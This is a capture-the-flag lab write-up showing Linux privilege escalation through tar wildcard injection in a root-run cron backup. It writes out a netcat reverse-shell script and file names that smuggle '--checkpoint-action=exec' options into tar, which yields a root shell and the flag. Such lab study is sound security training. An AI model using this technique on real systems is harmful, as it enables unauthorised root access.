# Cron job

https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

Check if theres any cron job

```
student@attackdefense:~$ crontab -l
no crontab for student
```

A zip file is being backed up using cron job. Extract the file and search the file name

```
student@attackdefense:~$ ls -l /tmp
total 4
-rw-r--r-- 1 root root 181 Jun 28 09:26 monitor.tar.gz
student@attackdefense:~$ tar -zxvf /tmp/monitor.tar.gz
1
2
3
4
5
student@attackdefense:~$ ls -l
total 20
-rw-r--r-- 1 student student 29 Sep 23  2018 1
-rw-r--r-- 1 student student 29 Sep 23  2018 2
-rw-r--r-- 1 student student 29 Sep 23  2018 3
-rw-r--r-- 1 student student 29 Sep 23  2018 4
-rw-r--r-- 1 student student 29 Sep 23  2018 5
student@attackdefense:~$ find / -name 3 2>/dev/null
/proc/irq/3
/proc/sys/net/netfilter/nf_log/3
/proc/13/task/13/fd/3
/proc/13/task/13/fdinfo/3
/proc/13/task/19/fd/3
/proc/13/task/19/fdinfo/3
/proc/13/fd/3
/proc/13/fdinfo/3
/proc/20/task/20/fd/3
/proc/20/task/20/fdinfo/3
/proc/20/fd/3
/proc/20/fdinfo/3
/proc/38/task/38/fd/3
/proc/38/task/38/fdinfo/3
/proc/38/fd/3
/proc/38/fdinfo/3
/sys/kernel/irq/3
/home/student/3
/var/log/monitor/3
```

Found the location of original file in `/var/log/monitor`

```
student@attackdefense:~$ cd /var/log/monitor
student@attackdefense:/var/log/monitor$ ls -l
total 20
-rw-r--r-- 1 root root 29 Sep 23  2018 1
-rw-r--r-- 1 root root 29 Sep 23  2018 2
-rw-r--r-- 1 root root 29 Sep 23  2018 3
-rw-r--r-- 1 root root 29 Sep 23  2018 4
-rw-r--r-- 1 root root 29 Sep 23  2018 5
```

Add file 6 and see if cron job compressed them into a folder

```
student@attackdefense:/var/log/monitor$ touch 6
```

The copressed file contains our added file
```
student@attackdefense:~$ tar -zxvf /tmp/monitor.tar.gz
1
2
3
4
5
6
```

Create file `shell.sh` that we want cron job to run. `root` runs this so it will run as root

```
student@attackdefense:/var/log/monitor$ printf '#! /bin/bash\nnc -e /bin/bash 127.0.0.1 1234' > shell.sh
student@attackdefense:/var/log/monitor$ cat shell.sh
#! /bin/bash
nc -e /bin/bash 127.0.0.1 1234student@attackdefense:/var/log/monitor$
```

Create special files which will act as arguments to the caller process and execute our `shell.sh`
```
student@attackdefense:/var/log/monitor$ touch -- '--checkpoint-action=exec=sh shell.sh'
student@attackdefense:/var/log/monitor$ touch -- '--checkpoint=1'
```

Start a listener
```
student@attackdefense:/var/log/monitor$ nc -lvnp 1234
listening on [any] 1234 ...
```

Then we wait for shell
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48868
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls -l
total 4
-rw-r--r-- 1 root root 33 Nov  2  2018 flag
cat flag
920cf978831b228cf7d13c8368b6c1f2
```